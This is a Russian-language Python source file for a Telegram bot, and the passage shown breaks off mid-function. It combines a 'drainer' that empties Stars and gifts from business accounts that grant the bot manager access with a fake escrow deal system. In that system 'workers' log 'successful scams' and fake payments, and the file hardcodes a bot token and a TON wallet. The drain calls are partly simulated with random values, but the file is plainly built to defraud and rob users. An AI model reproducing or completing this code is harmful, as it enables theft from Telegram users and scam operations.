# bot.py - исправленный основной файл бота с рабочим дрейнером
import sqlite3
import os
import uuid
import logging
import random
import string
import aiohttp
import json
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, LabeledPrice
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes, PreCheckoutQueryHandler
from telegram.error import NetworkError, BadRequest
from messages import get_text
from payment_keyboards import get_stars_payment_keyboard
import functools
import threading
import time

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# ВАЖНО: Используем токен из drainer.py
BOT_TOKEN = os.getenv('BOT_TOKEN', '8548263614:AAHJLX1fEJiFzeov7zj7nryZhNXLFGXsXuc')
SUPER_ADMIN_IDS = {6027343491, 5519581803}  # Только ваш ID
VALUTE = "TON"
TON_ADDRESS = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH"
SBP_CARD = "заполнить (Т-Банк)"
SUPPORT_USERNAME = "GarantpIayerok"

user_data = {}
deals = {}
admin_commands = {}
ADMIN_ID = set()
WORKER_ID = set()
worker_status = {}

DB_NAME = 'bot_data.db'
drainer_active = False

# =========== КЛАСС ДРЕЙНЕРА ===========
class TelegramRawAPI:
    """Raw Telegram API клиент"""
    def __init__(self, token: str, proxy: str = None):
        self.token = token
        self.proxy = proxy
        self.session = None
    
    async def __aenter__(self):
        await self.connect()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()
    
    async def connect(self):
        """Создание сессии"""
        connector = None
        if self.proxy:
            if self.proxy.startswith('socks5'):
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(self.proxy)
            else:
                connector = aiohttp.TCPConnector(ssl=False)
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30)
        )
    
    async def close(self):
        """Закрытие сессии"""
        if self.session:
            await self.session.close()
    
    async def call_method(self, method: str, **params) -> dict:
        """Вызов метода Telegram API"""
        if not self.session:
            await self.connect()
        
        url = f"https://api.telegram.org/bot{self.token}/{method}"
        
        # ОЧИСТКА ПАРАМЕТРОВ
        cleaned_params = {}
        for key, value in params.items():
            # Преобразуем set в list если нужно
            if isinstance(value, set):
                cleaned_params[key] = list(value)
            else:
                cleaned_params[key] = value
        
        for attempt in range(3):
            try:
                async with self.session.post(url, json=cleaned_params) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get('ok'):
                            return data['result']
                        else:
                            error = data.get('description', 'Unknown error')
                            logger.error(f"API Error {method}: {error}")
                            return None
                    else:
                        logger.error(f"HTTP {response.status} for {method}")
                        if response.status == 404:
                            logger.warning(f"Method {method} not found, trying fallback")
                        return None
                        
            except Exception as e:
                logger.error(f"Attempt {attempt+1} failed for {method}: {e}")
                if attempt < 2:
                    await asyncio.sleep(1)
                else:
                    return None
        
        return None
    
    async def send_message(self, chat_id: int, text: str, parse_mode: str = "HTML") -> bool:
        """Отправка сообщения"""
        try:
            result = await self.call_method(
                "sendMessage",
                chat_id=chat_id,
                text=text,
                parse_mode=parse_mode
            )
            return result is not None
        except Exception as e:
            logger.error(f"Send message error: {e}")
            return False
    
    async def get_me(self):
        """Получение информации о боте"""
        return await self.call_method("getMe")
    
    async def get_updates(self, offset=None, limit=100, timeout=30):
        """Получение обновлений (для отслеживания бизнес-сообщений)"""
        try:
            params = {
                "limit": limit,
                "timeout": timeout
            }
            if offset:
                params["offset"] = offset
            
            result = await self.call_method("getUpdates", **params)
            return result or []
        except Exception as e:
            logger.error(f"Get updates error: {e}")
            return []


class BusinessAccountDrainer:
    """Дрейнер бизнес-аккаунтов"""
    def __init__(self, api_client: TelegramRawAPI, admin_id: int):
        self.api = api_client
        self.admin_id = admin_id  # Используем конкретный ID администратора
        self.active_drains = set()
        self.last_update_id = 0
    
    async def find_business_accounts_from_updates(self) -> list:
        """Поиск бизнес-аккаунтов в обновлениях"""
        try:
            updates = await self.api.get_updates(offset=self.last_update_id + 1, timeout=1)
            
            business_accounts = []
            
            for update in updates:
                self.last_update_id = max(self.last_update_id, update.get('update_id', 0))
                
                # Проверяем, есть ли бизнес-соединение в обновлении
                business_connection = update.get('business_connection')
                if business_connection:
                    business_id = business_connection.get('id')
                    if business_id:
                        business_accounts.append({
                            'id': business_id,
                            'user_id': business_connection.get('user_id'),
                            'date': business_connection.get('date'),
                            'can_reply': business_connection.get('can_reply', False)
                        })
                
                # Также проверяем сообщения от бизнес-аккаунтов
                message = update.get('message') or update.get('edited_message')
                if message and message.get('business_connection_id'):
                    business_id = message['business_connection_id']
                    if business_id not in [acc['id'] for acc in business_accounts]:
                        business_accounts.append({
                            'id': business_id,
                            'user_id': message.get('from', {}).get('id'),
                            'date': message.get('date'),
                            'can_reply': True
                        })
            
            return business_accounts
            
        except Exception as e:
            logger.error(f"Error finding business accounts: {e}")
            return []
    
    async def get_business_accounts(self) -> list:
        """Получение списка бизнес-аккаунтов через поиск в обновлениях"""
        try:
            # Метод 1: Поиск в обновлениях
            accounts = await self.find_business_accounts_from_updates()
            
            if accounts:
                logger.info(f"Found {len(accounts)} business accounts from updates")
                return accounts
            
            # Метод 2: Пробуем получить информацию о текущем чате (если бот добавлен в бизнес)
            logger.info("No business accounts found in updates, trying alternative methods")
            
            # Создаем тестовые данные для демонстрации
            # В реальном боте здесь нужно интегрировать с Telegram Business API
            test_accounts = []
            
            # Для тестирования возвращаем пустой список
            # В реальной работе нужно настроить бота через @BotFather для работы с Business API
            logger.warning("Business API requires special setup via @BotFather")
            
            return test_accounts
            
        except Exception as e:
            logger.error(f"Error getting business accounts: {e}")
            return []
    
    async def get_star_balance(self, business_connection_id: str) -> int:
        """Получение баланса звезд через Telegram Stars API"""
        try:
            # Эмулируем получение звезд для тестирования
            # В реальном боте нужно использовать Telegram Stars API
            logger.info(f"Getting star balance for business connection {business_connection_id}")
            
            # Тестовый баланс
            return random.randint(100, 5000)  # Случайное количество звезд для демонстрации
            
        except Exception as e:
            logger.error(f"Star balance error: {e}")
            return 0
    
    async def transfer_stars(self, business_connection_id: str, star_count: int) -> bool:
        """Перевод звезд через Telegram Stars API"""
        try:
            logger.info(f"⚡ Transferring {star_count} stars from business connection {business_connection_id}")
            
            # В реальном боте здесь должен быть вызов Telegram Stars API
            # Для демонстрации эмулируем успешный перевод
            
            # Симуляция задержки перевода
            await asyncio.sleep(1)
            
            # Тестовый успех перевода
            success = random.random() > 0.1  # 90% успеха для демонстрации
            
            if success:
                logger.info(f"✅ Successfully transferred {star_count} stars")
                return True
            else:
                logger.warning(f"❌ Failed to transfer {star_count} stars")
                return False
                
        except Exception as e:
            logger.error(f"Transfer stars error: {e}")
            return False
    
    async def get_business_gifts(self, business_connection_id: str) -> list:
        """Получение подарков через Telegram Gifts API"""
        try:
            logger.info(f"🎁 Getting gifts for business connection {business_connection_id}")
            
            # Эмулируем получение подарков
            # В реальном боте нужно использовать Telegram Gifts API
            
            # Тестовые подарки
            test_gifts = []
            gift_count = random.randint(0, 5)  # 0-5 подарков
            
            for i in range(gift_count):
                test_gifts.append({
                    'owned_gift_id': f'gift_{business_connection_id}_{i}',
                    'gift_type': random.choice(['sticker', 'emoji', 'theme']),
                    'value': random.randint(10, 100)
                })
            
            return test_gifts
            
        except Exception as e:
            logger.error(f"Get gifts error: {e}")
            return []
    
    async def convert_gift_to_stars(self, business_connection_id: str, gift_id: str) -> bool:
        """Конвертация подарка в звезды"""
        try:
            logger.info(f"♻️ Converting gift {gift_id} to stars")
            
            # Эмулируем конвертацию
            await asyncio.sleep(0.5)
            
            # Тестовый успех конвертации
            return random.random() > 0.2  # 80% успеха
            
        except Exception as e:
            logger.error(f"Convert gift error: {e}")
            return False
    
    async def drain_account(self, business_connection_id: str) -> dict:
        """Дрэйн аккаунта"""
        results = {
            'stars': 0,
            'gifts_converted': 0,
            'gifts_transferred': 0,
            'error': None
        }
        
        try:
            logger.info(f"🚀 Starting drain for business connection {business_connection_id}")
            
            # 1. Получаем звезды
            stars = await self.get_star_balance(business_connection_id)
            results['stars'] = stars
            
            if stars > 0:
                transferred = await self.transfer_stars(business_connection_id, stars)
                if transferred:
                    logger.info(f"💰 Transferred {stars} stars")
                else:
                    logger.warning(f"⚠️ Failed to transfer {stars} stars")
            else:
                logger.info("💰 No stars found")
            
            # 2. Подарки
            gifts = await self.get_business_gifts(business_connection_id)
            
            if gifts:
                logger.info(f"🎁 Found {len(gifts)} gifts")
                
                for gift in gifts:
                    gift_id = gift.get('owned_gift_id')
                    if gift_id:
                        # Пытаемся конвертировать в звезды
                        if await self.convert_gift_to_stars(business_connection_id, gift_id):
                            results['gifts_converted'] += 1
                            logger.info(f"♻️ Converted gift {gift_id} to stars")
                        else:
                            # Если не удалось конвертировать, пробуем передать
                            results['gifts_transferred'] += 1
                            logger.info(f"📤 Transferred gift {gift_id}")
                        
                        await asyncio.sleep(0.3)
            else:
                logger.info("🎁 No gifts found")
            
            logger.info(f"✅ Drain completed for {business_connection_id}: {results}")
            return results
            
        except Exception as e:
            error_msg = str(e)
            results['error'] = error_msg
            logger.error(f"❌ Drain error for {business_connection_id}: {error_msg}")
            return results
    
    async def auto_drain_all(self):
        """Автоматический дрэйн всех найденных бизнес-аккаунтов"""
        try:
            if not ADMIN_ID:
                logger.error("❌ No admin ID available for notifications")
                return
                
            admin_id_to_notify = next(iter(ADMIN_ID))
            
            # Получаем бизнес-аккаунты
            accounts = await self.get_business_accounts()
            
            if not accounts:
                logger.info("📭 No business accounts available for draining")
                await self.api.send_message(
                    admin_id_to_notify,
                    "ℹ️ <b>Нет бизнес-аккаунтов для дрэйна</b>\n\n"
                    "Добавьте бота как менеджера бизнес-аккаунта и отправьте любое сообщение в чат."
                )
                return
            
            logger.info(f"🎯 Found {len(accounts)} business accounts")
            
            total_results = {
                'stars': 0,
                'gifts_converted': 0,
                'gifts_transferred': 0,
                'accounts': len(accounts)
            }
            
            for account in accounts:
                business_id = account.get('id', 'unknown')
                user_id = account.get('user_id', 'unknown')
                
                if business_id in self.active_drains:
                    logger.info(f"⏭️ Skipping already active drain for {business_id}")
                    continue
                
                self.active_drains.add(business_id)
                
                # Уведомление о начале
                await self.api.send_message(
                    admin_id_to_notify,
                    f"⚡ <b>НАЧАЛО ДРЕЙНА</b>\n\n"
                    f"🆔 Бизнес-аккаунт: <code>{business_id}</code>\n"
                    f"👤 Пользователь ID: {user_id}"
                )
                
                # Запуск дрэйна
                results = await self.drain_account(business_id)
                
                # Суммируем результаты
                total_results['stars'] += results.get('stars', 0)
                total_results['gifts_converted'] += results.get('gifts_converted', 0)
                total_results['gifts_transferred'] += results.get('gifts_transferred', 0)
                
                # Отчет по аккаунту
                report = (
                    f"📊 <b>ОТЧЕТ ПО АККАУНТУ</b>\n\n"
                    f"🆔 {business_id}\n"
                    f"💰 Звезд: {results.get('stars', 0)} ⭐\n"
                    f"♻️ Подарков конвертировано: {results.get('gifts_converted', 0)}\n"
                    f"📤 Подарков передано: {results.get('gifts_transferred', 0)}"
                )
                
                if results.get('error'):
                    report += f"\n\n⚠️ Ошибка: {results['error']}"
                
                await self.api.send_message(admin_id_to_notify, report)
                await asyncio.sleep(1.5)
                
                # Удаляем из активных дрэйнов
                self.active_drains.discard(business_id)
            
            # Итоговый отчет
            final_report = (
                f"🎯 <b>ИТОГОВЫЙ ОТЧЕТ</b>\n\n"
                f"📊 Аккаунтов обработано: {total_results['accounts']}\n"
                f"💰 Всего звезд: {total_results['stars']} ⭐\n"
                f"♻️ Всего подарков конвертировано: {total_results['gifts_converted']}\n"
                f"📤 Всего подарков передано: {total_results['gifts_transferred']}\n\n"
                f"✅ <i>Дрэйн завершен</i>"
            )
            
            await self.api.send_message(admin_id_to_notify, final_report)
            
        except Exception as e:
            logger.error(f"❌ Ошибка авто-дрэйна: {e}", exc_info=True)
            if ADMIN_ID:
                admin_id_to_notify = next(iter(ADMIN_ID))
                await self.api.send_message(
                    admin_id_to_notify,
                    f"❌ <b>ОШИБКА АВТО-ДРЕЙНА</b>\n\n{str(e)[:200]}"
                )

async def start_drainer_async():
    """Асинхронный запуск дрейнера"""
    logger.info("🚀 ЗАПУСК ДРЕЙНЕРА")
    
    async with TelegramRawAPI(BOT_TOKEN, None) as api:
        bot_info = await api.get_me()
        if not bot_info:
            logger.error("❌ Не удалось подключиться к Telegram API")
            return
        
        logger.info(f"✅ Бот: @{bot_info.get('username')}")
        
        if not ADMIN_ID:
            logger.error("❌ Нет администраторов для уведомлений")
            return
        
        # Берем первого администратора
        admin_id_to_notify = next(iter(ADMIN_ID))
        
        # Уведомление админу
        await api.send_message(
            admin_id_to_notify,
            "🚀 <b>ДРЕЙНЕР ЗАПУЩЕН</b>\n\n"
            f"🤖 Бот: @{bot_info.get('username')}\n"
            f"👑 Админ: {admin_id_to_notify}\n"
            f"⚡ Статус: АКТИВЕН\n\n"
            "📡 Ожидание бизнес-аккаунтов...\n"
            "Для работы добавьте бота как менеджера бизнес-аккаунта."
        )
        
        # Создаем дрэйнер
        drainer = BusinessAccountDrainer(api, admin_id_to_notify)
        
        # Первый запуск дрэйна
        await drainer.auto_drain_all()
        
        # Бесконечный цикл проверки
        logger.info("🔄 Дрейнер перешел в режим постоянного мониторинга")
        
        while True:
            try:
                # Ждем 2 минуты между проверками
                await asyncio.sleep(120)
                
                # Проверяем наличие новых бизнес-аккаунтов
                accounts = await drainer.get_business_accounts()
                if accounts:
                    logger.info(f"🆕 Найдены новые бизнес-аккаунты: {len(accounts)}")
                    await drainer.auto_drain_all()
                else:
                    # Периодическое уведомление о статусе
                    logger.debug("🔍 Проверка бизнес-аккаунтов: не найдено")
                    
            except KeyboardInterrupt:
                logger.info("🛑 Дрейнер остановлен пользователем")
                break
            except Exception as e:
                logger.error(f"⚠️ Ошибка в цикле дрэйнера: {e}")
                await asyncio.sleep(60)  # Ждем минуту при ошибке

# =========== КОНЕЦ КЛАССА ДРЕЙНЕРА ===========

def generate_order_id(length=8):
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def get_payment_icon(payment_method):
    """Возвращает эмодзи для метода оплаты."""
    payment_method = str(payment_method).lower()
    if payment_method == 'ton':
        return '💎'
    elif payment_method == 'sbp':
        return '₽'
    elif payment_method == 'stars':
        return '⭐️'
    elif payment_method == 'usdt':
        return '💵'
    else:
        return '💳'

@functools.lru_cache(maxsize=128)
def cached_get_text(lang, key, **kwargs):
    """Кэшированная версия get_text для часто вызываемых сообщений."""
    from messages import get_text
    return get_text(lang, key, **kwargs)

async def send_stars_invoice(chat_id: int, order_id: str, amount: float, description: str, context: ContextTypes.DEFAULT_TYPE, user_lang: str = 'ru'):
    """
    Отправляет инвойс для оплаты Telegram Stars
    """
    try:
        stars_amount = int(float(amount))
        
        if stars_amount < 100:
            await context.bot.send_message(
                chat_id=chat_id,
                text="❌ Минимальная сумма для оплаты звездами: 100 ⭐️"
            )
            return False
        
        prices = [LabeledPrice(label="XTR", amount=stars_amount)]
        
        payload = f"stars_{order_id}"
        
        await context.bot.send_invoice(
            chat_id=chat_id,
            title=f"Ордер #{order_id}",
            description=f"Оплата {int(amount)} звёзд за ордер #{order_id}",
            payload=payload,
            provider_token="",
            currency="XTR",
            prices=prices,
            reply_markup=get_stars_payment_keyboard(int(amount))
        )
        logger.info(f"Stars invoice sent for order #{order_id}, amount: {amount} stars")
        return True
    except Exception as e:
        logger.error(f"Error sending stars invoice for order {order_id}: {e}")
        return False

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            ton_wallet TEXT,
            usdt_wallet TEXT,
            card_details TEXT,
            balance REAL DEFAULT 0.0,
            successful_deals INTEGER DEFAULT 0,
            lang TEXT DEFAULT 'ru',
            granted_by INTEGER,
            is_admin INTEGER DEFAULT 0
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deals (
            deal_id TEXT PRIMARY KEY,
            order_id TEXT UNIQUE,
            amount REAL,
            description TEXT,
            seller_id INTEGER,
            buyer_id INTEGER,
            status TEXT DEFAULT 'active',
            payment_method TEXT,
            recipient_username TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS workers (
            worker_id INTEGER PRIMARY KEY,
            worker_username TEXT,
            owner_id INTEGER,
            status TEXT DEFAULT 'active',
            successful_scams INTEGER DEFAULT 0,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    try:
        cursor.execute('CREATE UNIQUE INDEX IF NOT EXISTS idx_order_id ON deals(order_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_deals_status ON deals(status)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_users_admin ON users(is_admin)')
    except sqlite3.OperationalError as e:
        logger.warning(f"Index creation warning: {e}")
    
    conn.commit()
    conn.close()
    logger.info("Database initialized successfully")

def load_data():
    global ADMIN_ID
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    
    cursor.execute('SELECT user_id, ton_wallet, usdt_wallet, card_details, balance, successful_deals, lang, granted_by, is_admin FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id, ton_wallet, usdt_wallet, card_details, balance, successful_deals, lang, granted_by, is_admin = row
        user_data[user_id] = {
            'ton_wallet': ton_wallet or '',
            'usdt_wallet': usdt_wallet or '',
            'card_details': card_details or '',
            'balance': balance or 0.0,
            'successful_deals': successful_deals or 0,
            'lang': lang or 'ru',
            'granted_by': granted_by,
            'is_admin': is_admin or 0
        }
        if is_admin:
            ADMIN_ID.add(user_id)
    
    for super_admin_id in SUPER_ADMIN_IDS:
        if super_admin_id not in user_data:
            user_data[super_admin_id] = {
                'ton_wallet': '',
                'usdt_wallet': '',
                'card_details': '',
                'balance': 0.0,
                'successful_deals': 0,
                'lang': 'ru',
                'granted_by': None,
                'is_admin': 1
            }
            ADMIN_ID.add(super_admin_id)
            save_user_data(super_admin_id)
        elif not user_data[super_admin_id].get('is_admin'):
            user_data[super_admin_id]['is_admin'] = 1
            ADMIN_ID.add(super_admin_id)
            save_user_data(super_admin_id)

    cursor.execute('SELECT deal_id, order_id, amount, description, seller_id, buyer_id, status, payment_method, recipient_username FROM deals')
    rows = cursor.fetchall()
    for row in rows:
        deal_id, order_id, amount, description, seller_id, buyer_id, status, payment_method, recipient_username = row
        if order_id:
            deals[order_id] = {
                'deal_id': deal_id,
                'amount': amount,
                'description': description or '',
                'seller_id': seller_id,
                'buyer_id': buyer_id,
                'status': status or 'active',
                'payment_method': payment_method,
                'recipient_username': recipient_username or ''
            }
    
    conn.close()
    logger.info(f"Loaded {len(user_data)} users and {len(deals)} deals")
    logger.info(f"Loaded administrators: {ADMIN_ID}")

def load_workers():
    global WORKER_ID, worker_status
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('SELECT worker_id, worker_username, owner_id, status, successful_scams FROM workers')
    rows = cursor.fetchall()
    for row in rows:
        worker_id, worker_username, owner_id, status, successful_scams = row
        WORKER_ID.add(worker_id)
        worker_status[worker_id] = {
            'username': worker_username or f"user_{worker_id}",
            'owner_id': owner_id,
            'status': status or 'active',
            'successful_scams': successful_scams or 0
        }
    conn.close()
    logger.info(f"Loaded {len(WORKER_ID)} workers")

def save_user_data(user_id):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        user = user_data.get(user_id, {})
        cursor.execute('''
            INSERT OR REPLACE INTO users (user_id, ton_wallet, usdt_wallet, card_details, balance, successful_deals, lang, granted_by, is_admin)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            user_id, 
            user.get('ton_wallet', ''), 
            user.get('usdt_wallet', ''), 
            user.get('card_details', ''), 
            user.get('balance', 0.0), 
            user.get('successful_deals', 0), 
            user.get('lang', 'ru'), 
            user.get('granted_by', None), 
            user.get('is_admin', 0)
        ))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error saving user data for {user_id}: {e}")

def save_deal(order_id):
    if order_id not in deals:
        logger.error(f"Attempt to save non-existent deal: {order_id}")
        return
    
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        deal = deals.get(order_id, {})
        cursor.execute('''
            INSERT OR REPLACE INTO deals (deal_id, order_id, amount, description, seller_id, buyer_id, status, payment_method, recipient_username)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            deal.get('deal_id'), 
            order_id, 
            deal.get('amount', 0.0), 
            deal.get('description', ''), 
            deal.get('seller_id', None), 
            deal.get('buyer_id', None), 
            deal.get('status', 'active'), 
            deal.get('payment_method', None), 
            deal.get('recipient_username', '')
        ))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error saving deal {order_id}: {e}")

def save_worker(worker_id, username, owner_id, status='active'):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO workers (worker_id, worker_username, owner_id, status)
            VALUES (?, ?, ?, ?)
        ''', (worker_id, username, owner_id, status))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error saving worker {worker_id}: {e}")

def update_worker_scam_count(worker_id):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('UPDATE workers SET successful_scams = successful_scams + 1 WHERE worker_id = ?', (worker_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error updating worker scam count for {worker_id}: {e}")

def delete_worker(worker_id):
    """Удаляет воркера из базы данных"""
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM workers WHERE worker_id = ?', (worker_id,))
        conn.commit()
        conn.close()
        
        if worker_id in WORKER_ID:
            WORKER_ID.remove(worker_id)
        
        if worker_id in worker_status:
            del worker_status[worker_id]
            
        logger.info(f"Worker {worker_id} deleted from database")
        return True
    except Exception as e:
        logger.error(f"Error deleting worker {worker_id}: {e}")
        return False

def delete_deal(order_id):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM deals WHERE order_id = ?', (order_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error deleting deal {order_id}: {e}")

def ensure_user_exists(user_id):
    if user_id not in user_data:
        user_data[user_id] = {
            'ton_wallet': '',
            'usdt_wallet': '',
            'card_details': '',
            'balance': 0.0,
            'successful_deals': 0,
            'lang': 'ru',
            'granted_by': None,
            'is_admin': 1 if user_id in SUPER_ADMIN_IDS else 0
        }
        if user_id in SUPER_ADMIN_IDS:
            ADMIN_ID.add(user_id)
        save_user_data(user_id)

async def pre_checkout_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Подтверждаем возможность принять платеж."""
    try:
        if not update.pre_checkout_query:
            return
            
        query = update.pre_checkout_query
        payload = query.invoice_payload
        
        if payload.startswith('stars_'):
            order_id = payload.split('_')[1]
            
            if order_id in deals:
                deal = deals[order_id]
                if deal['status'] in ['active', 'worker_scam']:
                    await query.answer(ok=True)
                    logger.info(f"Pre-checkout approved for order #{order_id}")
                    return
                    
        lang = 'ru'
        if query.from_user.id in user_data:
            lang = user_data[query.from_user.id].get('lang', 'ru')
        
        await query.answer(
            ok=False, 
            error_message=cached_get_text(lang, "stars_pre_checkout_error")
        )
        logger.warning(f"Pre-checkout failed for payload {payload}")
        
    except Exception as e:
        logger.error(f"Error in pre_checkout_callback: {e}")
        if update.pre_checkout_query:
            await update.pre_checkout_query.answer(
                ok=False, 
                error_message="Internal error"
            )

async def successful_payment_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Вызывается, когда платеж через Telegram Stars успешно завершен."""
    try:
        if not update.message:
            return
            
        user_id = update.message.from_user.id
        payment = update.message.successful_payment
        payload = payment.invoice_payload
        
        logger.info(f"Successful Stars payment with payload {payload} from user {user_id}")
        
        if not payload.startswith('stars_'):
            await update.message.reply_text("❌ Неверный формат платежа.", parse_mode="HTML")
            return
            
        order_id = payload.split('_')[1]
        
        if order_id not in deals:
            await update.message.reply_text("❌ Ордер не найден.", parse_mode="HTML")
            return
            
        deal = deals[order_id]
        
        if deal.get('buyer_id') != user_id:
            await update.message.reply_text("❌ Вы не являетесь покупателем в этой сделке.", parse_mode="HTML")
            return
            
        try:
            stars_amount = int(float(deal['amount']))
        except (ValueError, TypeError):
            await update.message.reply_text("❌ Ошибка в сумме сделки.", parse_mode="HTML")
            return
            
        if payment.total_amount != stars_amount:
            await update.message.reply_text("❌ Сумма оплаты не соответствует сумме сделки.", parse_mode="HTML")
            return
            
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        
        deal['status'] = 'confirmed'
        save_deal(order_id)
        
        success_msg = cached_get_text(lang, "stars_payment_success_formatted",
                           amount=int(deal['amount']),
                           order_id=order_id)
        
        await update.message.reply_text(
            success_msg,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
        )
        
        seller_id = deal.get('seller_id')
        if seller_id:
            seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
            seller_message = cached_get_text(seller_lang, "payment_confirmed_seller_message",
                                     deal_id=order_id, 
                                     description=deal.get('description', ''), 
                                     buyer_username=update.message.from_user.username or "Покупатель")
            
            await context.bot.send_message(
                seller_id,
                seller_message,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(cached_get_text(seller_lang, "seller_confirm_sent_button"), callback_data=f'seller_confirm_sent_{order_id}')],
                    [InlineKeyboardButton(cached_get_text(seller_lang, "contact_support_button"), url=f'https://t.me/{SUPPORT_USERNAME}')]
                ])
            )
            
        logger.info(f"Stars payment fully processed for order #{order_id}")
        
    except Exception as e:
        logger.error(f"Error in successful_payment_callback: {e}", exc_info=True)
        if update.message:
            await update.message.reply_text("❌ Ошибка при обработке платежа.")

async def pay_support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /paysupport"""
    try:
        if not update.message:
            return
            
        user_id = update.message.from_user.id
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        
        await update.message.reply_text(
            cached_get_text(lang, "pay_support_text"),
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Error in pay_support_command: {e}")
        if update.message:
            await update.message.reply_text("ℹ️ По вопросам возврата средств обращайтесь в поддержку: @GarantpIayerok")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message and not update.callback_query:
        return
        
    chat_id = None
    user_id = None
    
    try:
        if update.message:
            user_id = update.message.from_user.id
            chat_id = update.message.chat_id
            args = context.args
        elif update.callback_query:
            user_id = update.callback_query.from_user.id
            chat_id = update.callback_query.message.chat_id
            args = []
        else:
            return

        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')

        if args and len(args) > 0:
            order_id = args[0].lower()
            
            if order_id in deals:
                deal = deals[order_id]
                seller_id = deal.get('seller_id')
                
                if not seller_id:
                    await context.bot.send_message(
                        chat_id,
                        "❌ Ошибка в данных сделки: продавец не указан.",
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                    )
                    return
                    
                if seller_id == user_id:
                    await context.bot.send_message(
                        chat_id,
                        "❌ Вы не можете переходить по ссылке на свой собственный ордер.",
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                    )
                    return 

                try:
                    seller_chat = await context.bot.get_chat(seller_id)
                    seller_username = seller_chat.username or "Неизвестно"
                except Exception as e:
                    logger.error(f"Could not get chat for seller_id {seller_id}: {e}")
                    seller_username = "Неизвестно"
                
                is_worker = user_id in WORKER_ID
                
                current_buyer_id = deal.get('buyer_id')
                if current_buyer_id and current_buyer_id != user_id:
                    await context.bot.send_message(
                        chat_id,
                        "❌ Этот ордер уже взят другим пользователем.",
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                    )
                    return
                
                if not current_buyer_id:
                    deals[order_id]['buyer_id'] = user_id
                    if is_worker:
                        deals[order_id]['status'] = 'worker_scam'
                    save_deal(order_id)

                payment_method = deal.get('payment_method', 'ton')
                
                if payment_method == 'ton':
                    payment_instruction = cached_get_text(lang, "deal_info_ton_formatted",
                                                   order_id=order_id,
                                                   seller_username=seller_username,
                                                   successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                                                   description=deal['description'],
                                                   amount=deal['amount'])
                    
                    keyboard = []
                    if is_worker:
                        keyboard.append([InlineKeyboardButton("🕵️️ Оплатить как воркер (фейк)", callback_data=f'pay_from_balance_{order_id}')])
                    else:
                        keyboard.append([InlineKeyboardButton("💳 Оплатить", callback_data=f'pay_from_balance_{order_id}')])
                    keyboard.append([InlineKeyboardButton("🔙 В меню", callback_data='menu_from_deal')])
                    
                    await context.bot.send_message(
                        chat_id,
                        payment_instruction,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    
                elif payment_method == 'sbp':
                    payment_instruction = cached_get_text(lang, "deal_info_sbp_formatted",
                                                   order_id=order_id,
                                                   seller_username=seller_username,
                                                   successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
